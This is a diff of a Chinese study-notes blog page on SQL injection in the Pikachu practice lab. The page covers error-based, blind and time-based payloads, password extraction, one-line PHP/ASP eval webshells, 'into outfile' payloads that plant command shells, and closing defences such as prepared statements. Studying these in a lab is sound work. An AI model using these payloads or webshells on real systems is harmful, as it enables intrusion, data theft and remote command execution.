@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SQL注入漏洞 — 📒 笔记博客</title>
 <link rel="stylesheet" href="../../css/style.css">
-
 </head>
 <body>
 <nav class="nav">
@@ -31,7 +30,7 @@
         <h1>SQL注入漏洞</h1>
         <div class="post-meta">
           <span>📁 Pikachu靶场</span>
-          <span>📄 400 行</span>
+          <span>📄 231 行</span>
         </div>
       </header>
       <div class="post-content">
@@ -79,13 +78,13 @@
 <p>从#到行尾</p>
 <p>从--到行尾<sup class="footnote-ref"><a href="#fn-第二个破折号后面至少跟一个空格符（空格、tab、换行符）" id="fnref-第二个破折号后面至少跟一个空格符（空格、tab、换行符）">[第二个破折号后面至少跟一个空格符（空格、tab、换行符）]</a></sup></p>
 <p>从/<em> 到 </em>/<sup class="footnote-ref"><a href="#fn-跨行注释" id="fnref-跨行注释">[跨行注释]</a></sup></p>
-<blockquote>mysql&gt; SELECT 1+1;   # This comment continues to the end of line
-  &gt;
-  &gt; mysql&gt; SELECT 1+1;   -- This comment continues to the end of line
-  &gt;
-  &gt; mysql&gt; SELECT 1/<em> this is an in-line comment </em> / + 1;
-  &gt;
-  &gt; mysql&gt; SELECT 1+/ <em> this is amultiple-line comment</em>/1;</blockquote>
+<p>> mysql> SELECT 1+1;   # This comment continues to the end of line
+  >
+  > mysql> SELECT 1+1;   -- This comment continues to the end of line
+  >
+  > mysql> SELECT 1/<em> this is an in-line comment </em> / + 1;
+  >
+  > mysql> SELECT 1+/ <em> this is amultiple-line comment</em>/1;</p>
 <h3>搜索型注入</h3>
 <p>数据库里select * from member where username like '%k%';</p>
 <p>like '<mark>%xxxx%' or 1=1 #</mark>%''</p>
@@ -117,13 +116,11 @@
 <li>information_schema</li>
 </ul>
 <table>
-<thead>
-<tr>
+<thead><tr>
 <th style="text-align:left">SCHEMATA</th>
 <th style="text-align:left">提供当前MySQL实例中所有数据库信息</th>
 <th style="text-align:left">show databases的结果取之此表。</th>
-</tr>
-</thead>
+</tr></thead>
 <tbody>
 <tr>
 <td style="text-align:left">TABLES</td>
@@ -147,20 +144,18 @@
 <li>常用报错函数：</li>
 </ul>
 <table>
-<thead>
-<tr>
-<th style="text-align:left">updatexml()</th>
-<th style="text-align:left">MySQL对XML文档数据查询和修改的XPATH函数</th>
-</tr>
-</thead>
+<thead><tr>
+<th style="text-align:center">updatexml()</th>
+<th style="text-align:center">MySQL对XML文档数据查询和修改的XPATH函数</th>
+</tr></thead>
 <tbody>
 <tr>
-<td style="text-align:left">extractvalue()</td>
-<td style="text-align:left">MYSQL对XML文档数据查询的XPATH函数</td>
+<td style="text-align:center">extractvalue()</td>
+<td style="text-align:center">MYSQL对XML文档数据查询的XPATH函数</td>
 </tr>
 <tr>
-<td style="text-align:left">floor()</td>
-<td style="text-align:left">MYSQL中用来取整的函数</td>
+<td style="text-align:center">floor()</td>
+<td style="text-align:center">MYSQL中用来取整的函数</td>
 </tr>
 </tbody>
 </table>
@@ -171,28 +166,26 @@
 <hr>
 <h4>updatexml（）</h4>
 <table>
-<thead>
-<tr>
-<th style="text-align:left">函数作用</th>
-<th style="text-align:left">改变(查找并替换)XML文档中符合条件的节点的值。</th>
-</tr>
-</thead>
+<thead><tr>
+<th style="text-align:center">函数作用</th>
+<th style="text-align:center">改变(查找并替换)XML文档中符合条件的节点的值。</th>
+</tr></thead>
 <tbody>
 <tr>
-<td style="text-align:left">语法</td>
-<td style="text-align:left">UPDATEXML(xml_document, XPathstring, new_value)</td>
+<td style="text-align:center">语法</td>
+<td style="text-align:center">UPDATEXML(xml_document, XPathstring, new_value)</td>
 </tr>
 <tr>
-<td style="text-align:left">第一个参数</td>
-<td style="text-align:left">fiedname是String格式，为表中的**字段名**</td>
+<td style="text-align:center">第一个参数</td>
+<td style="text-align:center">fiedname是String格式，为表中的<strong>字段名</strong></td>
 </tr>
 <tr>
-<td style="text-align:left">第二个参数</td>
-<td style="text-align:left">XPathstring(Xpath格式的字符串)</td>
+<td style="text-align:center">第二个参数</td>
+<td style="text-align:center">XPathstring(Xpath格式的字符串)</td>
 </tr>
 <tr>
-<td style="text-align:left">第三个参数</td>
-<td style="text-align:left">new_value，String格式，替换查找到的符合条件的</td>
+<td style="text-align:center">第三个参数</td>
+<td style="text-align:center">new_value，String格式，替换查找到的符合条件的</td>
 </tr>
 </tbody>
 </table>
@@ -235,7 +228,7 @@ kobe' and updatexml(1,concat(0x7e, (select password from users where username='a
 <h3>delete</h3>
 <p>后台</p>
 <pre><code class="language-c++">if(array_key_exists('id',$_GET)){
-    $query="delete_from message where id={$_GET['id']}";
+    $query=&quot;delete_from message where id={$_GET['id']}&quot;;
 }</code></pre>
 <p>基于delete下的报错</p>
 <blockquote>1 or updatexml(1,concat(0x7e,database()),0)</blockquote>
@@ -244,12 +237,10 @@ kobe' and updatexml(1,concat(0x7e, (select password from users where username='a
 <hr>
 <h4>extractvalue()</h4>
 <table>
-<thead>
-<tr>
+<thead><tr>
 <th style="text-align:left">函数作用</th>
 <th style="text-align:left">从目标XML中返回包含所查询值的字符串</th>
-</tr>
-</thead>
+</tr></thead>
 <tbody>
 <tr>
 <td style="text-align:left">语法</td>
@@ -281,7 +272,7 @@ a:别名
 kobe' and (select 2 from (select <mark>count</mark>(<em>),concat(<strong> (select password from users where username='admin' limit 0,1)</strong>,floor(<mark>rand</mark>(0) </em> 2))x from information_schema.tables <mark>group by</mark> x)a)#</blockquote>
 <hr>
 <h3>http header注入</h3>
-<p>后台开发人员为了验证客户端头信息<sup class="footnote-ref"><a href="#fn-比如cookie验证" id="fnref-比如cookie验证">[比如cookie验证]</a></sup>或者通过http header头信息获取客户端的一些信息<sup class="footnote-ref"><a href="#fn-比如useragent、accept字段" id="fnref-比如useragent、accept字段">[比如useragent、accept字段]</a></sup>
+<p>后台开发人员为了验证客户端头信息[<sup>比如cookie验证]或者通过http header头信息获取客户端的一些信息[</sup>比如useragent、accept字段]
 会对客户端的<strong>httpheader信息进行获取并使用SQL进行处理</strong>，如果此时没有足够的安全考虑则可能会导致基于http header的SQLInject漏洞。</p>
 <p>user-agent</p>
 <p>输入'测试，最后报错SQL问题：有SQL注入漏洞</p>
@@ -303,8 +294,6 @@ kobe' and (select 2 from (select <mark>count</mark>(<em>),concat(<strong> (selec
 <p>输入'没有报错，直接提示不存在</p>
 <ol>
 <li>不管输入是否正确，都只显示两种情况<sup class="footnote-ref"><a href="#fn-0/1" id="fnref-0/1">[0/1]</a></sup></li>
-</ol>
-<ol>
 <li>在正确输入下，输入<strong>and 1=1/and 1=2</strong> 可以判断</li>
 </ol>
 <p>kobe' and 1=1#可以执行</p>
@@ -312,7 +301,7 @@ kobe' and (select 2 from (select <mark>count</mark>(<em>),concat(<strong> (selec
 <p><img src="SQL注入漏洞.assets/image-20260523113839647.png" alt="image-20260523113839647" loading="lazy"></p>
 <p><img src="SQL注入漏洞.assets/image-20260523113856593.png" alt="image-20260523113856593" loading="lazy"></p>
 <ul>
-<li>kobe' and ascii(substr(database(),1,1))&gt;113#</li>
+<li>kobe' and ascii(substr(database(),1,1))>113#</li>
 </ul>
 <p>返回kobe：and后面为真</p>
 <p>返回不存在：and后面为假</p>
@@ -324,18 +313,18 @@ kobe' and (select 2 from (select <mark>count</mark>(<em>),concat(<strong> (selec
   但还有一个条件，”时间”，通过特定的输入，判断后台执行的时间，从而确认注入!
   常用的Teat Payload:kobe' and sleep(5)#
   判断：输入:kobe 和输入kobe‘and sleep(5)#的区别，这里存在based time的SQL注入漏洞</p>
-<blockquote>kobe' and if((substr(database(),1,1))='p',sleep(5),null)#
-  &gt;
-  &gt; 第一个字符如果是p，就等5秒，否则不等</blockquote>
+<p>> kobe' and if((substr(database(),1,1))='p',sleep(5),null)#
+  >
+  > 第一个字符如果是p，就等5秒，否则不等</p>
 <hr>
 <h3>os远程控制</h3>
 <ul>
 <li>一句话木马</li>
 </ul>
 <p>短小精悍的木马客户端，隐蔽</p>
-<p>PHP:&lt;?php @eval($_POST['chopper']);?&gt;</p>
-<p>ASP:&lt;%eval request("chopper")%&gt;</p>
-<p>ASP.NET: &lt;%@ Page Language=" Jscript" %&gt; &lt;%eval(Request.Item["chopper"l,"unsafe");%&gt;</p>
+<p>PHP:<?php @eval($_POST['chopper']);?></p>
+<p>ASP:<%eval request("chopper")%></p>
+<p>ASP.NET: <%@ Page Language=" Jscript" %> <%eval(Request.Item["chopper"l,"unsafe");%></p>
 <ul>
 <li>写入恶意代码</li>
 </ul>
@@ -347,13 +336,11 @@ kobe' and (select 2 from (select <mark>count</mark>(<em>),concat(<strong> (selec
   1. 知道远程目录
   2. 远程目录有写权限
   3. 数据库开启secure_file_priv</li>
-</ul>
-<ul>
 <li>获取操作系统权限</li>
 </ul>
-<p>kobe' union select "&lt;?php @eval($_GET['test'])?&gt;",2 into outfile "/var/www/html/1.php"#</p>
+<p>kobe' union select "<?php @eval($_GET['test'])?>",2 into outfile "/var/www/html/1.php"#</p>
 <p>127.0.0.1/1.php?test=phpinfo</p>
-<p>kobe' union select "&lt;?php system($_GET['cmd'])?&gt;",2 into outfile "/var/www/html/2.php"#</p>
+<p>kobe' union select "<?php system($_GET['cmd'])?>",2 into outfile "/var/www/html/2.php"#</p>
 <p>127.0.0.1/2.php?cmd=ifconfig</p>
 <h3>表（列）名的暴力破解</h3>
 <p>猜表名：kobe' and exists(select * from aa)#</p>
@@ -365,13 +352,9 @@ kobe' and (select 2 from (select <mark>count</mark>(<em>),concat(<strong> (selec
 <li>代码
   1. 对输入严格转义、过滤
   2. 预处理、参数化</li>
-</ul>
-<ul>
 <li>网络
   1. WAF设备启用防SQL Inject注入策略/类似防护系统
   2. 云端防护<sup class="footnote-ref"><a href="#fn-360网站卫士，阿里云盾" id="fnref-360网站卫士，阿里云盾">[360网站卫士，阿里云盾]</a></sup></li>
-</ul>
-<ul>
 <li>转义+过滤</li>
 </ul>
 <p><img src="SQL注入漏洞.assets/image-20260523144340678.png" alt="image-20260523144340678" loading="lazy"></p>
@@ -379,7 +362,7 @@ kobe' and (select 2 from (select <mark>count</mark>(<em>),concat(<strong> (selec
 <li>PDO的prepare预处理（预处理+参数化）<mark>（推荐）</mark></li>
 </ul>
 <p><img src="SQL注入漏洞.assets/image-20260523144435449.png" alt="image-20260523144435449" loading="lazy"></p>
-<p>不是拼接-&gt;防注入</p>
+<p>不是拼接->防注入</p>
 <h3>自动sqlmap</h3>
 <ul>
 <li>用法：
